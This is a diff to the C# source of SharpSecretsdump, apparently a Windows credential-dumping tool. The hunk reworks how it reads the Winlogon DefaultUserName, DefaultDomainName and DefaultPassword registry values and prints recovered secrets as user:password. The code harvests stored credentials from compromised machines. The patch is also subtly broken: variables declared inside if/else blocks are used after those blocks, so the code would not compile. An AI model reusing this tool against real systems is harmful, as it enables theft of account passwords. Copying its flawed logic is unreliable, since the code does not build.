@@ -247,27 +247,29 @@ namespace SharpSecretsdump
                                     }
                                     else if (secret.ToUpper().StartsWith("DEFAULTPASSWORD"))
                                     {
-                                        string username = Encoding.ASCII.GetString(GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultUserName"));
-                                        string domain = Encoding.ASCII.GetString(GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultDomainName"));
-                                        string password = Encoding.ASCII.GetString(GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultPassword"));
-                                        if (username != null)
+                                        byte[] usernameArr = GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultUserName");
+                                        byte[] domainArr = GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultDomainName");
+                                        byte[] passwordArr = GetRegKeyValue("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "DefaultPassword");
+                                        if (usernameArr != null)
                                         {
+                                            string username = Encoding.ASCII.GetString(usernameArr);
                                             username = username.Remove(username.Length - 1);
                                         }
                                         else
                                         {
-                                            username = "(Unkown User)";
+                                            string username = "(Unkown User)";
                                         }
-                                        if (domain != null)
+                                        if (domainArr != null)
                                         {
+                                            string domain = Encoding.ASCII.GetString(domainArr);
                                             domain = domain.Remove(domain.Length - 1);
                                             username = $"{domain}\\{username}";
                                         }
                                         Console.WriteLine($"{secret}: {username}:{Encoding.Unicode.GetString(secretBlob.secret)}");
                                         // For some reason password can be also defined in Winlogon
-                                        if (password != null)
+                                        if (passwordArr != null)
                                         {
-                                            Console.WriteLine($"{secret}: {username}:{password}");
+                                            Console.WriteLine($"{secret}: {username}:{Encoding.ASCII.GetString(passwordArr)}");
                                         }
                                     }
                                     else
